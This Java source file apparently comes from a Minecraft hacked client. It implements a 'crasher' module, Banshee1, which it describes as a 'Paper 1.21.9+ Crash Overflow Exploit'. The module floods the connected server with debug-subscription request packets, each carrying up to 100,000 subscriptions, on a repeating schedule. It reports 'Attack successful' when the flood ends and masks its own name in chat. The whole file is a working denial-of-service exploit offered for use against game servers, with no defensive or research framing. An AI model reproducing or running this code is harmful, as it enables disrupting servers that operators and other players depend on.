package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.components.objects.DebugSubscription;
import us.whitedev.protocol.components.objects.SimpleDebugSubscription;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.protocol.packets.play.PacketDebugSubscriptionRequest;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Banshee1 implements Crasher {
    private static final String METHOD_NAME = "Banshee1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int subs = Integer.parseInt(args[3]);
        int threadSleep = Integer.parseInt(args[4]);
        long loopAmount = Long.parseLong(args[5]);

        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (protocol >= 773) {
            Set<DebugSubscription<?>> subscriptions = new HashSet<>();

            for (int i = 0; i < subs; i++) {
                subscriptions.add(new SimpleDebugSubscription(0));
            }

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketDebugSubscriptionRequest(subscriptions), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        }else{
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.9+ (Protocol: 773+)&7, and your current protocol is &c" + protocol, true);
        }
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Subs", OptionType.INTEGER),
                new OptionUtil("Sleep", OptionType.INTEGER),
                new OptionUtil("Loop", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], subs[100000], sleep[1], loop[1]";
    }

    @Override
    public String getDescription() {
        return "Paper 1.21.9+ Crash Overflow Exploit";
    }
}
